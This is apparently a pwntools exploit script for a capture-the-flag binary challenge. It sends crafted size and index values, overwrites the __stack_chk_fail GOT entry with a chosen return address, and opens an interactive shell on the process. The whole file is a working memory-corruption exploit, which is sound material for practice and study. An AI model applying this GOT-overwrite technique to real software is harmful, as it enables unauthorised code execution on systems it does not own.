from pwn import *
target=process('./chall')
#target=remote( 'pwn.byteband.it', 8000)
context.terminal=["tmux","split","-h"]
gdb.attach(target,gdbscript="b *0x400878")

print(target.recvuntil("size: "))
target.send(str(9999999))
print(target.recvuntil("idx: "))
target.send(str(2856281))
print(target.recvuntil("where: "))

retaddr=0x400835
stackcheck_got=0x601018

target.sendline(str(stackcheck_got))
print(target.recv())
target.sendline(p64(retaddr))

print(target.recv())
target.interactive()
